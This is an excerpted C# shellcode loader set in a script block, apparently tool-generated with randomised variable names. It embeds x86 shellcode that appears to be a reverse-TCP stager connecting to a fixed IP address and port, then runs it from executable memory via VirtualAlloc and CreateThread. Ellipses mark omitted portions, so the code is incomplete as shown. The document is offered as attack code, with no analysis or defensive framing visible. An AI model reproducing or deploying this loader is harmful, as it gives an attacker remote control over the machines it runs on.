...
0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x01,0xd3,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x12,0x54,0xd3,0x68,0x02,0x00,0x23,0x28,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr cWflXS8Ukgs = VirtualAlloc(IntPtr.Zero,(UIntPtr)w44yiI.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(w44yiI,0,cWflXS8Ukgs,w44yiI.Length);
        IntPtr qrEbAdnMdjhK = IntPtr.Zero;
        IntPtr k13IWFEF = CreateThread(IntPtr.Zero,UIntPtr.Zero,cWflXS8Ukgs,IntPtr.Zero,0,ref qrEbAdnMdjhK);
    }
</script>
